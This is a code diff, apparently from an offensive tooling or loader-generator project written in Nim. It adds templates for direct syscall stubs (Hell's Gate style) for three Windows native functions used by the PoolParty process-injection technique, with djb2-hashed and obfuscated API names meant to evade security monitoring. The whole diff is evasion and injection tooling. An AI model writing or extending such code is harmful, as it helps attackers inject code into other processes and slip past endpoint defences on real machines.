@@ -257,6 +257,62 @@ var
 
 """
 
+# poolparty defs
+# NtSetInformationWorkerFactory, ZwSetIoCompletion, ZwAssociateWaitCompletionPacket
+
+let HellsgateNtSetInformationWorkerFactoryDelegate*  = """
+
+proc NtSetInformationWorkerFactory(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall` 
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    ntSetInformationWorkerFactoryfuncHash        : uint64            = djb2_hash(obf("NtSetInformationWorkerFactory"))
+    ntSetInformationWorkerFactoryTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntSetInformationWorkerFactoryfuncHash)
+
+"""
+
+let HellsgateZwSetIoCompletionDelegate*  = """
+
+proc ZwSetIoCompletion(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall` 
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    zwSetIoCompletionfuncHash        : uint64            = djb2_hash(obf("ZwSetIoCompletion"))
+    zwSetIoCompletionTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : zwSetIoCompletionfuncHash)
+
+"""
+
+let HellsgateZwAssociateWaitCompletionPacketDelegate*  = """
+
+proc ZwAssociateWaitCompletionPacket(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.asmNoStackFrame.} =
+    asm ===
+        mov r10, rcx
+        mov eax, `syscall` 
+        mov r11, `syscallJumpAddress`
+        jmp r11
+        ret
+    ===
+
+var
+    zwAssociateWaitCompletionPacketfuncHash        : uint64            = djb2_hash(obf("ZwAssociateWaitCompletionPacket"))
+    zwAssociateWaitCompletionPacketTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : zwAssociateWaitCompletionPacketfuncHash)
+
+"""
+
+
+
 let HellsgateStub*  = """
 
 when defined(Hellsgate):
